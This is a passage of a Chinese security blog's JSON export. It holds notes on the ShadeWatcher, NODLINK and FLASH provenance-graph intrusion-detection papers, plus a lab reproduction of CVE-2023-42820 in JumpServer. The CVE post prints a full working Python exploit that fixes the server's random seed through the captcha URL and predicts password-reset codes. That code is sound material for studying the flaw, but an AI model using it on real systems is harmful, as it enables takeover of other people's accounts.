大于预定义的阈值，我们会进一步标记该交互为潜在的网络威胁。为了满足这一原则，我们通过优化广泛使用的成对损失来学习 GNN 模块中的参数。\n$$ \\mathcal{L}_{higher} = \\sum_{(h, r_0, t) \\in \\mathcal{G}_K} \\sum_{(h', r_0', t') \\notin \\mathcal{G}_K} \\sigma(\\hat{y}_{ht} - \\hat{y}_{h' t'}). $$其中，r0 表示交互关系；在基于正常审计记录建立的知识图谱中的交互被视为负实例（良性实例）；同时，我们随机抽取在知识图谱中未观察到的交互作为正实例（潜在恶意实例）。请注意，我们抽样的交互不一定反映网络威胁。我们将在附录 C 中进一步解释它们对威胁检测的影响。\n通过结合一阶建模和高阶建模的损失，我们最小化了以下目标函数，以学习推荐模型中的参数\n$$ \\mathcal{L} = \\mathcal{L}_{first} + \\mathcal{L}_{higher} + \\lambda \\|\\Theta\\|_2, $$其中，$Θ=\\{e_h,e_r,e_t,W_r,W_l∣h,t∈E,r∈R′,l∈\\{1,…,L\\}\\}$是可训练模型参数的集合；λλ 是超参数，用于控制 L2 正则化项，以解决过拟合问题\n模型适配 随着系统行为的变化，SHADEWATCHER 可能会对训练阶段未观察到的良性系统实体交互发出误报。因此，有必要跟上交互的演变。在实践中，安全运营中心的分析师会不断筛选威胁警报，以过滤掉误报。因此，将 SHADEWATCHER 泛化到不断演变的交互的自然方式是让分析师参与动态更新。为此，我们提供了一个选项，让分析师对误报交互进行重新标注，使 SHADEWATCHER 能够将误报作为额外的监督信息来修正其推荐模型。例如，假设 (gtcache, interact, /proc/27/stat) 被检测为恶意，但后来经过人工验证为误报。为了避免未来对类似交互的错误，SHADEWATCHER 将该交互作为新的负实例反馈，以重新训练其模型。【还是老问题，你要是人工标注的有点垃圾那不是还是存在问题吗】\n更具体地说，分析师需要通过追踪潜在恶意交互中两个系统实体之间的来源来重建攻击场景，从而验证警报的性质。分析师面临的主要挑战是理解之前未见过的交互，例如，程序第一次加载配置文件的情况。为了促进对这些交互的解释，一个直观的方法是将额外的辅助信息——例如，二进制分析、程序理解和网络监控——纳入知识图谱（KG），以便分析师能够从不同的角度推理关于新交互的信息，我们将此留待未来的工作中。我们承认低质量（例如，错误）反馈可能会误导推荐模型。然而，由于 SHADEWATCHER 提供了细粒度的检测信号，突出了攻击的关键指标，分析师有很高的机会正确区分真实和虚假的警报。\n结果 测试阶段是指从训练阶段开始，从输入系统实体交互到通过推荐模型预测网络威胁的持续时间。平均而言，预测 792,333 次交互（68,097 次恶意交互和 724,236 次良互）需要 8.16 秒。到目前为止，我们已经在 GPU 上进行了所有实验，但 GPU 在大多数实际威胁检测场景中可能不可用。因此，我们通过在禁用 GPU 的同一服务器上执行检测来进一步评估 SHADEWATCHER 在 CPU 上的效率。尽管测试时间增加到 220 秒，但我们相信效率仍然很有希望，因为数据集的规模相当于两个月的用户每日数据\nIMPLEMENTATION 系统审计收集：为了收集整个系统的审计记录，我们利用了 Linux 审计功能，使用覆盖 32 种常用系统调用的规则集（详细信息见附录 D）。一旦生成审计记录，它会被处理成 JSON 格式，并通过 Apache Kafka 以流的方式发送到 SHADEWATCHER。\n并行来源图构建：我们的初始原型显示，来源图（PG）的构建非常耗时，这降低了整体系统性能。为了说明这一点，我们提到我们的原型在 DARPA TRACE 数据集的 PG 构建上大约花费六个小时，而预测网络威胁仅需几秒钟。\n为了解决这个问题，我们实现了一个并行处理管道，如图 4 所示，以允许并发审计记录处理。分配器首先以流式方式加载本地审计记录，并批量插入记录队列。一旦构建器在记录队列中识别到一个新批次，它会将该批次分配给一个空闲线程。随后，线程将生成一个来源子图并存入图队列。同时，图队列中的子图会被生成器不断消耗，以构建最终的 PG。在我们当前的实现中，并行管道仅适用于以公共数据模型格式 [62]（例如，DARPA TC 数据集格式）的审计记录，因为它允许独立记录处理。由商业审计框架生成的审计记录之间的巨大依赖关系给支持并发处理带来了不可忽视的挑战 [10]。例如，读记录中使用的文件描述符总是在打开或套接字记录中定义。我们相信，单独的并行甚至分布式 PG 构建本身就是一个有趣的研究课题，因此我们将此扩展留给未来的工作。\n推荐模型训练：我们使用 Google TensorFlow [63] 实现了我们的推荐模型。该模型通过 Adam 优化器 [64] 进行优化，其中批量大小、边际 γ 和归一化 λ 固定为 1024、1 和 10^−5。我们训练模型 30 个周期，并采用提前停止策略——如果在验证集上的准确率连续五个周期未提高，则训练将被终止。为了减轻过拟合问题，我们进一步采用了 dropout 技术 [65]，其丢弃比例为 0.2。我们使用 Xavier [66] 初始化模型参数 Θ。对于超参数，我们应用网格搜索：学习率调试范围为 {0.0001, 0.001, 0.01}；系统实体的嵌入大小在 {16, 32, 64} 中搜索；GNN 中的传播层数在 {1, 2, 3} 中调节；阈值在 {-1, -0.5, 0, 0.5, 1} 中搜索。根据最佳准确率，我们报告的结果是在学习率为 0.001、嵌入大小为 32、两个传播层的隐藏维度分别为 32 和 16，以及阈值为 -0.5 的设置下得到的。\n补充知识 TransR TransR是一种用于知识图谱嵌入的方法，它旨在将实体和关系映射到一个向量空间，以便更好地捕捉知识图谱中的信息。与其他方法相比，TransR通过将关系视为从一个实体空间到另一个实体空间的映射来处理不同类型的关系。这种方法允许模型更灵活地表示复杂的多关系结构。\n二分图 BG通常指的是“二分图”（Bipartite Graph），它是一种特殊类型的图，节点可以分为两个不相交的集合，且图中的每条边都连接这两个集合中的一个节点。换句话说，二分图的节点可以被划分成两组，使得任意边都只连接来自不同组的节点。\n我的评价 感觉这个GNN的方式似曾相识，是一个很重的模型，然后套了个知识图谱和推荐系统来找异常交互，还是找异常边。主要创新点也在这个套的知识图谱和推荐系统。感觉还是挺慢的，没GPU要220s，有点鸡肋。\n和之前看的几篇比，也没有什么构图方面的缩减，图注意力也见过，而且用了图注意力肯定会慢。你要问我为啥他能中A，我觉得就形式化表达写的相当不错。\n","date":"2024-09-02T16:25:49+08:00","image":"http://localhost:1313/p/shadewatcher/index/1725273027411_hu15327168154211169235.png","permalink":"http://localhost:1313/p/shadewatcher/","title":"Shadewatcher"},{"content":"导语 NDSS24， doi is here\n这也是一篇溯源图方向的论文，主要是优化基于在线来源的溯源图检测系统，即他的目标是让EDR能直接用上\n贡献 在基于在线来源的检测系统中，将APT攻击检测过程建模为斯坦纳树问题 提出了一种新颖的内存缓存设计 提出一种高效的攻击筛选方法 提出一种新的STP近似算法【在APT攻击检测中比传统的算法更有效，同时保持了相同的复杂度】 Introduction 目标 降低基于溯源图的检测系统的开销 增强及时性 基于STP的检测系统的挑战与应对方法 长期攻击：STP需要提前了解整个溯源图。但是，由于数据大小的原因，不可能将所有来源数据保存在内存中，并且由于 I/O 瓶颈，将其存储在磁盘数据库中也不切实际。 提出了一种新颖的内存缓存设计，该设计具有评分方法，可以优先考虑可能导致APT攻击的事件，并捕获STP时间窗口内长时间运行的攻击。 有效地识别STP中的终端：现有的检测方法不适合在线系统 设计了一个IDF加权的三层变分自编码器（VAE） 目前用于 STP 的近似算法对于 APT 攻击检测仍然不够有效。现有的方法[需要找到两个节点之间的最短路径，开销太高 开发了一种面向重要性的在线STP优化贪婪算法，该算法实现了低计算复杂度和有限竞争比。 除了这些之外，NODLINK在深信服的产品中应用了并在两天捕获了7个APT攻击（这也太不P了）\nBackground 大部分都因为日志量大、建图成本等原因只能靠日志在事后进行溯源，所以最近有直接接受系统审计事件的系统，在发现攻击后以溯源子图的形式输出警报\n现实世界中，在溯源APT时，攻击事件与良性事件之间的比率不平衡，精确检测攻击的难度高。\n现有的基于源的检测系统可分为两类：基于规则的检测系统和基于学习的系统。然而，现有的系统无法同时实现足够的节点级精度和节点级召回率。\n在线斯坦纳树问题 斯坦纳树问题：斯坦纳树问题是组合优化问题，与最小生成树相似，是最短网络的一种。最小生成树是在给定的点集和边中寻求最短网络使所有点连通。而最小斯坦纳树允许在给定点外增加额外的点，使生成的最短网络开销最小。\n给定边为非负权重$w_e$的无向图 $G=(V,E)$，和一个顶点序列（其中的顶点被称作终端）$T=\\{t_1, t_2, t_3, \\dots , t_k\\}$，它输出一个子图$S_i$，该子图覆盖$\\{t_1, t_2, . . . , t_i\\}$。其目标是最小化总成本。\n这个贪心算法接受带权无向图G和终端流TS。\n首先初始化终端集T和已选边集S为空集。对于TS中的每个终端$t_i$，初始化PATH集为空，与T中所有终端求最短路径$P_j$加入PATH集。选择PATH中最短的P，将他的点加入到S，将当前终端$t_i$加入到已选终端集T中。最终结果即是S。\n这个算法的竞争比率为$O(\\log{k})$，其中k是终端数，也就是说在线算法的最坏情况下的表现与最优离线算法的表现之比为$O(log{k})$\noverview NODLINK是一个在线APT攻击检测系统。它接受从安装在受监控主机上的代理收集的系统源事件的事件流。NODLINK的输出是包含关键攻击步骤的简洁警报来源图。\n算法每$\\Delta$秒进行四个阶段，分别是\n（1） 内存缓存构建（第 6 行）：把窗口内的事件存在内存里以避免IO瓶颈，还保持和更新异常节点。\n（2） 终端识别（第 7 行）：通过分析本地特征（例如，命令行参数、进程名称、访问的文件等），NODLINK 可以对每个进程分配一个异常得分，用于衡量它是否存在异常行为。【这tm不还是规则】\n（3） Hopset 构建（第 8 行）：hopset可以理解为溯源子图的构建，方便溯源用的。把攻击相关的过程视为终端【这你咋知道哪些攻击相关的？】，将有向图转换为无向图，每条边的权重为相等的非负权重，w = 1，以简化化解。【说是最novel的点】除了标准STP（算法1，第6行说是对于在线任务还是太耗时了），还设计了一个面向重要性的贪婪算法，将时间复杂度从$O(n^2)$变成了$O(n)$。\n（4） 综合检测（第 9 行）：将Hopset 与之前构建的缓存数据相结合，分析子图的异常得分。\n设计细节 内存缓存 内存中的缓存会缓冲以下子图：（1）具有较高的异常得分的子图（2）正在积极演变的子图。内存缓存会在每个长度为 ∆ 的时间窗口内更新当前时间窗口的最小 Steiner 树（STP）解决方案。\n缓存以\u0026lt;srcid, dstid, attr\u0026gt;的形式保存，srcid 和 dstid 分别是边的源 ID 和目标 ID，attr 是边的属性，包括操作类型和时间戳。边的类型及其可用的操作类型如表I所示。\n定义一个hopset的能量为$E=\\epsilon^{age}*has(h)$，其中$\\epsilon$是衰减因子，age 是自上次更新到跳跃集以来经过的时间窗口。如果给定的hopset在上一个时间窗口内已更新（例如，新事件已添加到图形中），则 age = 0。否则，NODLINK 每过一次窗口，年龄就会增加 1。缓存满的时候能量最低的hopset被淘汰，放Neo4j数据库里\n从磁盘检索节点：为了检测长期攻击，NODLINK 设计了图数据库的存储策略，并在遇到被驱逐的节点时从数据库中检索子图。当将跳集驱逐到磁盘时，NODLINK 存储所有节点和边的关系和属性，包括异常得分，并将其移除。NODLINK 为每个节点分配一个唯一的 uuid，使用 md5 值生成。对于进程，NODLINK 计算 pid + tid + 命令行的 md5 值。对于文件，NODLINK 计算 /full/path/filename 的 md5 值。对于 IP，NODLINK 计算 src ip:port:dst ip:port 的 md5 值。这样，NODLINK 就可以检索被驱逐节点和跳集的属性。由于每个节点都有一个唯一的 uuid，我们可以通过在缓存中查找来检查节点是否被逐出到磁盘。由于缓存中的节点由哈希表组织，因此查找操作需要 O（1） 时间。\n终端识别 NODLINK扫描内存缓存，并根据其节点级特征将可疑进程节点识别为终端。请注意，尽管 NODLINK 的输出仅包含异常进程，但它确实考虑了异常文件和 IP 地址。NODLINK将异常文件和IP地址合并到访问它们的进程中。【一个节点有三个内容，包括进程，文件和ip】此设计决策背后的逻辑是，恶意文件和 IP 在被进程访问之前无法生效。因此，关注异常进程可以减少文件和 IP 上的重复警报，而不会损失节点级别的准确性。NODLINK分析了三种类型的节点级特征：启动进程的命令行（命令行）、进程访问的文件（files）和进程（network）访问的IP地址。终端识别包括两个步骤：首先，它基于节点级特征将过程节点嵌入到数值向量中。其次，它使用机器学习模型来检测异常。\n嵌入 NODLINK首先将过程的节点级特征投影到数值向量上。在高层次上，进程的嵌入是三个节点级特征的嵌入向量的加权和。NODLINK选择使用自然语言处理（NLP）技术嵌入节点级特征，以处理节点级特征中看不见的模式。嵌入过程有两个步骤。NODLINK 首先分别嵌入命令行、文件名和 IP 地址。然后，它将它们的嵌入组合为进程的最终嵌入。\nNODLINK将非字母数字符号转换为空格，以将节点级特征转换为句子。转换后，NODLINK使用FastText将句子转换为数值向量。\n嵌入节点级特征的主要挑战是它们可能包含不属于自然语言的字符串。例如，“/var/spool/8b7dc29d0e”包含哈希字符串“8b7dc29d0e”。现有的基于 NLP 的文档嵌入技术无法处理这些特殊标记。因此，NODLINK通过删除NLP技术Nostril删除无效含义的标记来删除非自然语言。\n嵌入的第二步是将三个节点级特征的数值向量相加，如下式\n$$ V_{p} = w_{c} * V_{c} + \\sum{w_{fi} * V_{fi}} + \\sum{w_{ni} * V_{ni}} $$其中$V_{c}$, $V_{fi}$, $V_{ni}$是命令行、文件和网络连接的嵌入，$w_{c}$, $w_{fi}$, $w_{ni}$ 是权重，正式来说，文件的权重 $w_{fi}$ 定义为 $w = \\log(\\frac{P}{P_{fi}})$，其中 $P$ 是所有进程的数量，而 $P_{f}$ 是操作文件 $fi$ 的进程数量。我们采用类似的方法来计算 IP 地址的权重 $w_{ni}$。这个设计背后的逻辑是针对不同进程共享的文件和 IP 地址进行处理。例如，所有进程都会加载$ \\textit{libc}$ 文件，因此$ \\textit{libc}$ 对于建模进程的本地特征并没有太大用处。为了提高进程建模的准确性，我们设计权重来降低像$ \\textit{libc}$ 文件这样的文件或 IP 地址的影响。最后，命令行的权重 $w_c$ 是所有文件和 IP 的权重的平均值，以确保 $w_c$ 在文件和 IP 地址的数量级上具有相同的规模。\n这个嵌入还是挺轻量的，因为NODLINK的设计目标就是速度。\n为了检测终端，NODLINK利用VAE模型来计算来源图中每个进程节点的异常分数，然后将异常分数较高的节点识别为终端。VAE模型在其他任务中被广泛用作轻量级异常检测模型。具体就是将进程的嵌入给VAE重构，由于VAE在学习过程中学习数据的潜在分布，如果是输入数据属于训练数据的分布，VAE应该能够很好地重构它。因此重构前后的嵌入相差越大就越可能是异常节点。\n然而重建误差可能会为不稳定的进程产生误报，比如Web 浏览器倾向于访问随机 IP 地址。直接使用重建错误会不断将 Web 浏览器等进程识别为终端，从而导致误报。为了解决这个问题，我们引入了稳定性评分SV来平衡不稳定过程的重建误差。我们将SV定义为历史数据中与p同名的过程的嵌入向量的簇数。假设我们有一个名为“web_browser”的进程，在历史数据中我们找到了100个名为“web_browser”的进程实例。我们对这100个进程的嵌入向量进行聚类分析，结果发现这些嵌入向量分成了10个簇。这表明名为“web_browser”的进程在历史数据中表现出10种不同的行为模式。于是，稳定性评分SV就等于10。\n$$ AS(p) = \\log(\\frac{RE(p)}{SV(p)}) $$RE是重构误差，SV是稳定性评分。这样，当一个进程的行为较为不稳定（SV较大）时，即使重构误差较大，异常评分也不会太高，从而减少了误报。\n如果进程节点的 AS 高于历史数据中 AS 的第 90 个百分位数，则 NODLINK 会将其标记为异常。\n离线模型训练：虽然NODLINK是一个在线检测框架，但它需要训练FastText模型、VAE模型、SV模型和阈值，才能从离线的历史数据中引发异常。NODLINK 在历史数据中的命令行、文件路径和 IP 地址上训练 FastText 模型。然后，NODLINK使用经过训练的嵌入向量来进一步训练VAE模型。NODLINK通过定期对历史数据运行DBSCAN算法[58]来离线计算SV。它首先将嵌入向量的过程分类为不同的组。然后，将进程名称及其集群数量存储在内存哈希表中，用于在线异常分数计算。\nhopset构建 在终端识别步骤中检测到终端之后，NODLINK在当前时间窗口中运行Hopset构建来解决STP（最短路径树）问题。在某个时间窗口中的hopset是每个终端的邻域上下文，其中包括有界邻居节点和到这些节点的路径。NODLINK利用了一种称为重要性评分引导搜索（ISG）算法的贪心算法，基于本地信息（如AS和节点度）来构建hopset。Hopset构建输出一个具有低复杂度和有界竞争比的近似STP解。\n优化主要在于算法 1 中，使用 Dijkstra 算法找到第 6 行的最短路径，时间复杂度为$O(n^2)$，我们设计的基于重要性评分的搜索的复杂度为$O(n)$\n具体构建过程如下：假设终端集中有n个节点，Hopset构建首先启动n个搜索过程，每个搜索过程对应一个终端。搜索过程是通过一个重要性评分IV来进行贪心搜索的。每个贪心搜索过程生成一个hopset，并且节点数量是有界的。如果已经发现了θ个节点，NODLINK将停止探索新节点。这种提前停止的动机来自于攻击聚合假设。该假设指出在来源图中，攻击行为在拓扑上是接近的，因为攻击者需要通过一系列立足点逐步创建攻击行为的执行链。\n我们的工具在贪婪搜索过程中合并重叠的hopset，以高效地连接终端，同时限制节点探索，而不是使用经典贪婪算法中复杂度较高的最短路径算法。这种近似解决方案通过识别拓扑上相近的与攻击相关的异常，减少了异常检测中的假阳性。跳集构建为每个跳集分配一个HAS（hopset anomaly score）以便未来调查，重点关注基于异常分数(高)和与终端的距离(近)的重要节点。这使得远离的节点优先级降低，从而排除假阳性，并利用APT攻击的攻击多态性，后者指出攻击相关的事件级异常在起源图中是拓扑上相近的，因为攻击者通过少数的立足点（如后门或反向Shell）进行攻击活动。\nHopset Construction的关键组成部分是重要性分数的设计，首先是异常分数 AS。第二个是与终端中最近节点的距离【直觉是利用 APT 攻击的攻击聚合性】。\n$$ IV(n)={\\alpha}^i({\\beta}*AS(n)+{\\gamma}*FANOUT(n)) $$${\\alpha}^i$反映了节点$n$与终端之间的距离。当$n$远离终端时，$IV$会降低。具体而言，$0\u003c{\\alpha}\u003c1$是一个距离衰减因子，$i$是$n$与其最近的终端之间的跳数。$AS(n)$是该节点的异常分数。我们还为节点$n$引入了一个补充因子$FANOUT(n)$，其定义为$FANOUT(n)=out\\_degree(n)/(in\\_degree(n) + 1)$。引入这个术语是因为我们观察到某些过程倾向于生成大量不传播数据和控制流依赖的“叶子”节点。这些“叶子”节点对于\\ac{apt}攻击检测和调查并不重要。因此，我们使用$FANOUT$术语来降低它们的优先级。我们将$FANOUT$和$AS$结合，使用两个权重$\\beta$和$\\gamma$。需要注意的是，$AS$是主要因素，而$FANOUT$是补充因素。因此，需要满足$\\beta \u003e\u003e \\gamma$。\nhopset的异常分数HAS是hopset中所有节点的异常分数之和。\n全面检测 首先使用在当前时间窗口内构造的跳跃集更新内存中的缓存跳跃集。NODLINK将当前时间窗口的跳跃集与缓存中的跳跃集（如果它们具有相同的节点）合并。但是，如果我们直接合并跳跃集，在最坏的情况下，一个长时间运行的进程被识别为终端，并在每个时间窗口内更新θ个不同的邻居，就有可能导致依赖性爆炸。为了防止这种情况的发生，我们限制了 θ 节点内每个终端的跳集，并在合并时将 IV 值较低的节点替换为 IV 值较高的节点。\n合并跳集之后将HAS也随之更新，通过HAS将每个时间窗口的STP解和全局解结合起来。NODLINK利用Grubbs检验来检测HAS异常高的跳跃集。Grubbs 检验检测一组样本的最大值是否为异常值。我们之所以选择 Grubbs 检验，是因为它是非参数化的，并且对污染的训练数据集具有鲁棒性。NODLINK 在内存缓存上运行 Grubbs 测试多轮，直到没有标记异常值。最后，将检测到的异常值标识为攻击活动，并发出警报。\n【Grubbs检验是一种用于检测数据集中异常值（即极端值或离群值）的统计方法。它基于假设检验的原理，通常用于正态分布的数据。】\n理论分析 终端识别过程中，NODLINK需要通过复杂度为O（E）的边缘来探索节点级的特征\n在 Hopset 构造中，NODLINK 通过贪婪探索 θ 节点为每个终端构造 hopset。因此，检测的复杂度为 O（θN），其中 N 是来源图中的节点数。\n竞争比率：在第 V-C 节中，我们将算法 1 第 6 行的最短路径探索替换为 importancescore 引导的搜索。这种替换可能会导致检测中出现更大的 Steiner 树，从而影响简洁性。因此，在本节中，我们分析了新的竞争比率，即我们的算法生成的斯坦纳树的大小与理论上最优解之间的比率。回想一下，标准在线 STP 优化算法的竞争比率为 O（log（k）），其中 k 是终端数。因此，我们只需要将我们的方法与标准的在线STP优化算法进行比较。\n总而言之，由于 θ 是一个常数，因此 NODLINK 可以得到 2θ log（k） = O（log（k）） 有界竞争比率。\n我的评价 论文写的稀烂，看得我头皮发麻。\n我觉得这篇文章只把进程作为节点，把和他相关的东西作为节点属性，比如启动这个进程的cmd，这个进程访问的文件、ip等，这些在其他常见的方法里都被当做实体，当做节点。\n这样做图的规模就会变小很多，对于节点属性的处理也是fasttext转成向量， 然后拿VAE去生成节点异常值，都是现成的东西。\n感觉他就是一个优化STP的工作，而寻找联通量大的节点也是出于一种恶意节点会创建很多子进程的直觉吧。\n但是讲道理他这也就是把一个子图变成节点了，把别人的子图粒度的检测在他这说成节点粒度的检测，感觉ndss不愧是曾经B里的A，现在纯纯是A里的B，这也太工程了。\n","date":"2024-07-24T12:22:46+08:00","image":"http://localhost:1313/p/nodlink/index/1722260277932_hu7971434232450059787.png","permalink":"http://localhost:1313/p/nodlink/","title":"NODLINK"},{"content":"介绍 JumpServer是使用 Python / Django 进行开发，遵循 Web 2.0 规范的全球首款完全开源的堡垒机软件。因其开源，无插件，Web界面美观，操作方便，分布式，符合4A规范等特点，被很多企业广泛用于内部资产（物理机，云主机等）的管理。 CVE-2023-42820通过可控的伪随机数播种，构造随机数调用过程，计算出重置密码后的验证码，从而实现任意账号密码重置。\n环境搭建 下载https://github.com/vulhub/vulhub/blob/master/jumpserver/CVE-2023-42820/，修改config.env的DOMAINS=[你的ip:端口]\n然后直接docker compose，注意这里要启动docker服务、要安装了docker-compose\n1 docker compose up -d 这里我虽然写了8888还是在8080，感觉并不用写端口，因为我看docker也没做映射\n好的，做了实验还是得填8080，大概是后端的端口，想改可能还要同时改env里的 CORE_HOST=http://127.0.0.1:8080\n用admin：admin直接登陆http://your-ip:8080即可\n漏洞利用 可以看到\nPatched versions\u0026gt;= v2.28.19, \u0026gt;= v3.6.5\n在3.6.5和2.28.19都有一个叫做fix: 修复 random error的commit\n在jumpserver中，按照下图逻辑进行验证\n这里使用了django-simple-captcha实现验证码部分，\n可以看到用了一个key，而且还提示了其他用这个部分的同学不要用同一个key来生成图片。 在url.py里可以看到这个key就是跟在后面的字符串 这个key在url里，是可控的，类似这样。\nhttp://10.207.139.20:8080/core/auth/captcha/image/4cbbebb2305a4ef0d0e1242c352e288073537a7d/\n在网络服务中，接收用户交互的线程并不唯一，而random.seed()的作用只在当前线程，因此需要将我们控制的key作用在所有线程，所以exp的第一步为重放爆破，将我们控制的key大量发送get请求，使得所有服务器接收的线程均设置random.seed()。然后通过api调用，定位到忘记密码流程。 使用form_invalid方法对用户名是否存在进行验证，并通过random_string方法生成一个长度为36的token，带着token跳转到forgot-password页面。\n再通过api定位发送验证码的调用函数\n使用该类下create函数，通过random_string方法生成一个长度为6的验证码并进行发送\n看下来这个random.seed()是作用于全流程的，所以我们需要考虑的是\n返回一开始分析的captcha_image函数，该函数控制图片验证码生成，渲染，在每次的忘记密码找回时，均先调用该函数生成图片验证码，用户输入正确的用户名和验证码，才能跳转下一步，我们需要明确在该函数部分调用了几次random类的函数。\n从头梳理，在django-simple-captcha里直接搜索random,可以找到\n是旋转字符的，因为生成的captcha都是4个字符（8、*、3、=）\n所以调用4次random.randrange(),在settings.py里也可以找到对应的定义，range是（-35，35）\n还有noisy_function中\nnoizy_dot也用到了random，用了 range(int(size[0]*size[1]*0.1))次， 在jumpserver中可以看到capcha的大小是180*38，采用noise_dot的噪声算法\n所以大概用了这些random\n1 2 3 4 5 6 for i in range(4): random.randrange(-35,35) for j in range(int(180*38*0.1)): random.randint(0, 180) random.randint(0, 38) 于是得到exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 import requests import logging import sys import random import string import argparse from urllib.parse import urljoin logging.basicConfig(stream=sys.stdout, level=logging.INFO, format=\u0026#39;%(asctime)s - %(levelname)s - %(message)s\u0026#39;) string_punctuation = \u0026#39;!#$%\u0026amp;()*+,-.:;\u0026lt;=\u0026gt;?@[]^_~\u0026#39; def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = [\u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;special_char\u0026#39;] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f\u0026#39;Parameters {kwargs_keys} must have at least one `True`\u0026#39; assert length \u0026gt;= args_true_count, f\u0026#39;Expected length \u0026gt;= {args_true_count}, bug got {length}\u0026#39; can_startswith_special_char = args_true_count == 1 and special_char chars = \u0026#39;\u0026#39;.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026amp; set(args_string_map[k])): # 没有包含指定的字符, retry break else: if not can_startswith_special_char and password[0] in args_string_map[\u0026#39;special_char\u0026#39;]: # 首位不能为特殊字符, retry continue else: # 满足要求终止 while 循环 break password = \u0026#39;\u0026#39;.join(password) return password def nop_random(seed: str): random.seed(seed) for i in range(4): random.randrange(-35, 35) for p in range(int(180 * 38 * 0.1)): random.randint(0, 180) random.randint(0, 38) def fix_seed(target: str, seed: str): def _request(i: int, u: str): logging.info(\u0026#39;send %d request to %s\u0026#39;, i, u) response = requests.get(u, timeout=5) assert response.status_code == 200 assert response.headers[\u0026#39;Content-Type\u0026#39;] == \u0026#39;image/png\u0026#39; url = urljoin(target, \u0026#39;/core/auth/captcha/image/\u0026#39; + seed + \u0026#39;/\u0026#39;) for idx in range(30): _request(idx, url) def send_code(target: str, email: str, reset_token: str): url = urljoin(target, \u0026#34;/api/v1/authentication/password/reset-code/?token=\u0026#34; + reset_token) response = requests.post(url, json={ \u0026#39;email\u0026#39;: email, \u0026#39;sms\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;form_type\u0026#39;: \u0026#39;email\u0026#39;, }, allow_redirects=False) assert response.status_code == 200 logging.info(\u0026#34;send code headers: %r response: %r\u0026#34;, response.headers, response.text) def main(target: str, email: str, seed: str, token: str): fix_seed(target, seed) nop_random(seed) send_code(target, email, token) code = random_string(6, lower=False, upper=False) logging.info(\u0026#34;your code is %s\u0026#34;, code) if __name__ == \u0026#34;__main__\u0026#34;: parser = argparse.ArgumentParser(description=\u0026#39;Process some integers.\u0026#39;) parser.add_argument(\u0026#39;-t\u0026#39;, \u0026#39;--target\u0026#39;, type=str, required=True, help=\u0026#39;target url\u0026#39;) parser.add_argument(\u0026#39;--email\u0026#39;, type=str, required=True, help=\u0026#39;account email\u0026#39;) parser.add_argument(\u0026#39;--seed\u0026#39;, type=str, required=True, help=\u0026#39;seed from captcha url\u0026#39;) parser.add_argument(\u0026#39;--token\u0026#39;, type=str, required=True, help=\u0026#39;account reset token\u0026#39;) args = parser.parse_args() main(args.target, args.email, args.seed, args.token) 具体来说，就是通过发送30个都发送带有对应seed的验证码生成请求来使每个线程的seed都为我们所设定的seed,此时服务端每个线程的random函数都是经过了一轮之前分析过得random操作后的状态，通过调用nop_random，我们本地的random状态和服务端的random状态是一致的，send_code方法和jumpserver的UserResetPasswordSendCodeApi中的code一致，由于我们本地和服务端状态一致，所以我们本地与运行send_code和服务端运行send_code也是一样的，生成的code也就是一样的了。\n参考 https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw\n","date":"2024-05-21T14:41:04+08:00","image":"http://localhost:1313/p/cve-2023-2480/index/1716361642462_hu18240455802379854528.png","permalink":"http://localhost:1313/p/cve-2023-2480/","title":"CVE 2023 2480"},{"content":"导语 IEEE S\u0026amp;P 2024, doi is here\nmotivation 简单来说还是对效率问题提出了一个解，针对大的溯源图，开发了一个嵌入回收数据库来存储在训练阶段生成的节点嵌入，检测的时候读嵌入数据库即可，不用重新算嵌入\nQ:为什么训练阶段的节点嵌入在检测时能用到，覆盖率怎么搞？\nIntroduction 现有的溯源图IDS的存在局限\n通常会忽略有价值的语义数据，例如来源图中的进程名称、命令行参数、文件路径和 IP 地址。【Q：但是不是说这些内容容易造成混淆吗？把这些通过word2vec编码成向量不是还是容易造成混淆吗？】（A：意思是不带这些可以提升泛化性，对于没见过的攻击比较管用，但是可能因为学的不够多而有误报，我觉得还是泛化性更重要一点。差评) 一些IDS忽略了系统事件的时间顺序和因果顺序的重要性。 可扩展性问题，尤其是在处理大型来源图时。 粗粒度检测：许多 IDS 识别恶意子图而不是单个恶意节点，这使得警报验证和攻击重建对安全分析师来说既耗时又容易出错。 GNN技术不可扩展，而且速度非常慢 现有方法都是学习良性行为 因此，这篇文章\n采用基于Word2Vec的嵌入技术，将来源图中存在的各种节点属性（如进程名称、命令行参数、文件路径和IP地址）编码为语义丰富的特征向量。 修改了 Word2Vec 技术以获得时间敏感的嵌入，解决了忽略事件之间时间顺序的问题。(咋修改的？) 通过仅选择与威胁识别相关的边来提高图表示学习中图遍历的效率，设计了一个GNN嵌入数据库，该数据库的灵感来自以前应用于语言模型的嵌入回收技术（2022) 报告危险节点（node)而非危险子图（graph)，能够对adversarial mimicry attacks on provenance-based IDSes【Q：这是啥？】（A：http://dx.doi.org/10.1145/586110.586145)鲁棒。根据检测生成的演变图（AEG)来帮助溯源。说是检测危险边（edge)的消耗太大，node是最好的trade off 这篇文章首次（2024年以来)在Darpa OpTC数据集上进行了评估，该数据集是DARPA迄今为止发布的最大的系统日志数据集。这些数据集涵盖了广泛的攻击场景和系统行为。说是比SOTA快三倍\n作者的小结：\n• 我们提出了一种基于来源的IDS，即FLASH，它利用来源图中的上下文和结构信息来增强其检测能力。\n• 我们引入了一个两步过程，分别使用 Word2Vec 和 GNN 生成语义和上下文嵌入。在此过程之后，通过轻量级分类器模型进行实时异常检测，确保系统的可扩展性和效率。\n• 